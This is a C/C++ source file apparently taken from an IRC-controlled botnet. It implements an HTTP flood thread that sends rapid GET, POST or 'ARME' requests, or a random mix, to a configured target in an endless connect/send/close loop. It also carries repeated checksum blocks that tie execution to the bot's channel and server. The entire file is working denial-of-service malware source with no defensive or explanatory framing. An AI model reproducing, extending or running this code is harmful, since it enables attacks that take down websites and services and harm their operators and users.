#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
DWORD WINAPI DdosGetPostArme(LPVOID)
{
    char cTargetHost[MAX_PATH];
    strcpy(cTargetHost, cFloodHost);

    char cTargetPath[DEFAULT];
    strcpy(cTargetPath, cFloodPath);

    char cTargetData[DEFAULT];
    strcpy(cTargetData, cFloodData);

    unsigned short usTargetPort = usFloodPort;

    unsigned short usType = usFloodType;

    if(true)
    {
        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
        char *cStr = cCheckString;
        unsigned long ulCheck = (360527*3)/201;
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum7)
            return GetRandNum(100000) + 50000;
        // <!-------! CRC AREA STOP !-------!>
    }

    unsigned short usPacketGenerationType;
    if(usType == DDOS_HTTP_RAPID_GET)
        usPacketGenerationType = HTTP_GET_NORMAL;
    else if(usType == DDOS_HTTP_RAPID_POST)
        usPacketGenerationType = HTTP_POST_NORMAL;
    else if(usType == DDOS_HTTP_ARME)
        usPacketGenerationType = HTTP_ARME;
    else if(usType == DDOS_HTTP_COMBO)
    {
        unsigned short usRandNum = GetRandNum(100);

        if(usRandNum < 33)
            usPacketGenerationType = HTTP_GET_NORMAL;
        else if(usRandNum < 66)
            usPacketGenerationType = HTTP_POST_NORMAL;
        else
            usPacketGenerationType = HTTP_ARME;
    }

    HOSTENT *paddr;

    SOCKADDR_IN sck;

    for(unsigned short us = 0; us < 25; us++)
    {
        paddr = fncgethostbyname(cTargetHost);
        if(paddr != NULL)
            break;

        Sleep(100);
    }

    sck.sin_addr = (*(in_addr*)*paddr->h_addr_list);

    sck.sin_port = fnchtons(usTargetPort);
    sck.sin_family = AF_INET;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
    char *cStr = cCheckString;
    unsigned long ulCheck = (360527*3)/201;
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum7)
        return GetRandNum(100000) + 50000;
    // <!-------! CRC AREA STOP !-------!>

    //unsigned short usDelay = 1;

    SOCKET sSock;
    DWORD dwMode = 1;

    //DWORD dwCycleCount = 0;

    while(bDdosBusy)
    {
        sSock = fncsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if(sSock == INVALID_SOCKET)
            continue;

        //fncioctlsocket(sSock, FIONBIO, &dwMode);

        char cPacket[MAX_DDOS_BUFFER];
        strcpy(cPacket, GenerateHttpPacket(usPacketGenerationType, cTargetHost, cTargetPath, usTargetPort, cTargetData));
        //printf("Sent:\n%s\n", cPacket);

        if(fncconnect(sSock, (SOCKADDR*)&sck, sizeof(sck)) != SOCKET_ERROR)
        {
            if(fncsend(sSock, cPacket, strlen(cPacket), NULL) != SOCKET_ERROR)
                dwHttpPackets++;
        }

        memset(cPacket, 0, strlen(cPacket));
        /*int nReceivedData = 0;
        do
            nReceivedData = recv(sSock, cPacket, MAX_DDOS_BUFFER, 0);
        while(nReceivedData != 0);

        printf("Received:\n%s\n\n--\n\n", cPacket);*/

        fncclosesocket(sSock);

        //if(dwCycleCount % 1 == 0)
        //    Sleep(usDelay);

        //Sleep(GetRandNum(usDelay) + (usDelay / 2));
        //dwCycleCount++;
    }
    return 1;
}
#endif
